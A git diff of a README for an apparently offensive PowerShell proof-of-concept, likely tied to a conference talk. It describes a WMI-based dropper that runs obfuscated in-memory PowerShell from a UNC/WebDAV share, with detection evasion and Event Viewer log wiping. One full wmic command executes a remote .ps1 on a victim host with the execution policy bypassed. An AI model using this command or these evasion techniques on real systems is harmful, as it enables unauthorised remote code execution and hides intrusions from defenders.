@@ -19,21 +19,24 @@ Of course, **feel free to reuse code parts for your own purpose in case of need 
         The "stage 1" is a simple dropper for payload delivery through UNC/WebDAV using basic obfuscation (require admin. privs for RCE over WMI ofc).
 	It is executed from attackers station (C2C) to run in-memory fud PowerShell without the well-known `IWR/IEX` method calls.
 
-   [*] Notes:
-        UNC/WebDAV could be replaced by WMI namespaces as presented in WmiSploit project `https://github.com/secabstraction/WmiSploit`.
-        However, the executed command is then limited to 8190 chars due to `-EncodedCommand` usage for b64 payload, this is the reason why I prefered this method for the PoC.
+[*] Notes:
+UNC/WebDAV could be replaced by WMI namespaces as presented in WmiSploit project `https://github.com/secabstraction/WmiSploit`.
+        
+However, the executed command is then limited to 8190 chars due to `-EncodedCommand` usage for b64 payload, this is the reason why I prefered this method for the PoC.
 
-        Note that .ps1 file is executed over WMI without `invoke-expression` (iex) nor `wget/invoke-webrequest` (iwr) method to prevent alerting.
-        Classic stager from command line: 
+An important thing here is that .ps1 file is executed over WMI without `invoke-expression` (iex) nor `wget/invoke-webrequest` (iwr) method to prevent alerting.
+
+Classic stager from command line: 
 	```
             wmic.exe /node:"Victime-PC" /user:WORKGROUP\admin process call create "PowErSheLl -eXecUtIonpOliCY BypAsS -NopRofilE -fILe \\Vboxsvr\shared\BSIDESIE\class-derivation.ps1"
 	```
 
     
    **Stage 2** (executed on target):
-         In-memory build stage 2 using "-File" parameter (obfuscated PowerShell with random Class Derivation).
-	 Randomly generated class derivation and "EventViewer" logs removing for detection mechanisms/blue team evasion.
-         Stage 1 execution is not removed from logs for demo purpose, it should be modified for a total discretion ;).
+  In-memory build stage 2 using "-File" parameter (obfuscated PowerShell with random Class Derivation).
+  
+  Randomly generated class derivation and "EventViewer" logs removing for detection mechanisms/blue team evasion.
+  Stage 1 execution is not removed from logs for demo purpose, it should be modified for a total discretion ;).
 
 
    [*] Notes:
